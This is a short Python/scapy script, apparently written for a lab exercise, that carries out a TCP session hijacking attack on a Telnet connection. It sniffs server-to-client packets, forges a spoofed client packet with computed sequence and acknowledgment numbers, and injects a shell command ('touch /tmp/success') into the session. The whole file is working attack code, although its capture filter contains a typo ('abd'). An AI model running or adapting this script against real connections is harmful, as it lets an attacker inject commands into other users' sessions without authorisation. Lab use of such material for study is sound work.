#! /usr/bin/python3
from scapy.all import *
import sys

def spoof(pkt):

    old_ip= pkt[IP]
    old_tcp=pkt[TCP]
    tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4 

    newseq = old_tcp.ack + 8
    newack = old_tcp.seq + tcp_len
    ip = IP(src=old_ip.dst , dst= old_ip.src)
    tcp = TCP(sport=old_tcp.dport, dport=old_tcp.sport , flags='A', seq = newseq, ack=newack)

    data = "\ntouch /tmp/success\n"
    pkt =  ip/tcp/data

    ls(pkt)
    send(pkt,verbose=0)
    quit()

cli = sys.argv[1]
srv = sys.argv[2]

myFilter = 'tcp and src host {} and dst host {} abd src port 23'.format(srv,cli)

print ("Running Session Hijacking attack ...")
print("Filter used : {}".format(myFilter))
print("Spoofing TCP packets form Client ({}) to server ({})".format(cli,srv))

sniff(iface='enp0s3',filter=myFilter,prn=spoof)

#tcp hijack 